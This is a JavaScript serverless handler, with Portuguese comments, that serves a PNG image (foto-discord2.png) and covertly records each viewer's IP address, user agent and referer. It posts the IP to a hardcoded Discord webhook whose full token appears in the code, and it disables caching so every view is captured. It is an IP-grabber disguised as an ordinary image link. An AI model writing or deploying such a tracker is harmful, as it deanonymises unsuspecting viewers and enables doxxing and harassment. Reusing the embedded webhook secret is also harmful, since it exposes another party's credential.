import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  // 1. CAPTURA O IP
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 'IP não detectado';
  const userAgent = req.headers['user-agent'] || 'N/A';
  const referer = req.headers['referer'] || 'Direto';
  const agora = new Date();
  
  console.log('══════════════════════════════════════');
  console.log('📸 FOTO ACESSADA - foto-discord2.png');
  console.log('══════════════════════════════════════');
  console.log('🌐 IP:', ip);
  console.log('🕐 Data:', agora.toLocaleString('pt-BR'));
  console.log('🔗 Referer:', referer);
  console.log('👤 User-Agent:', userAgent.substring(0, 100));
  console.log('📊 URL:', req.url);
  console.log('══════════════════════════════════════');
  
  // 2. DISCORD WEBHOOK
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
  
  if (DISCORD_WEBHOOK.includes('discord.com')) {
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `📸 **foto-discord2.png ACESSADA**\n🌐 IP: \`${ip}\`\n🕐 ${agora.toLocaleString('pt-BR')}\n🔗 ${req.url}`
        })
      });
      console.log('✅ Mensagem enviada para Discord');
    } catch (err) {
      console.log('❌ Erro Discord:', err.message);
    }
  }
  
  // 3. ENVIA A FOTO foto-discord2.png
  try {
    // CAMINHO DA SUA FOTO
    const fotoPath = path.join(process.cwd(), 'public', 'foto-discord2.png');
    
    // Verifica se arquivo existe
    if (!fs.existsSync(fotoPath)) {
      console.log('❌ ERRO: Arquivo não encontrado:', fotoPath);
      console.log('📁 Listando arquivos em public/:');
      
      try {
        const publicPath = path.join(process.cwd(), 'public');
        const arquivos = fs.readdirSync(publicPath);
        console.log('Arquivos encontrados:', arquivos);
      } catch (e) {
        console.log('Não foi possível listar arquivos');
      }
      
      throw new Error('Arquivo foto-discord2.png não encontrado');
    }
    
    // Lê o arquivo
    const fotoBuffer = fs.readFileSync(fotoPath);
    console.log('✅ Foto carregada. Tamanho:', fotoBuffer.length, 'bytes');
    
    // Configura headers
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', fotoBuffer.length);
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    // Envia a foto
    res.send(fotoBuffer);
    console.log('✅ Foto enviada com sucesso!');
    
  } catch (error) {
    console.log('❌ ERRO AO ENVIAR FOTO:', error.message);
    
    // Fallback: pixel vermelho simples
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );
    
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Cache-Control', 'no-cache');
    res.send(pixel);
  }
}
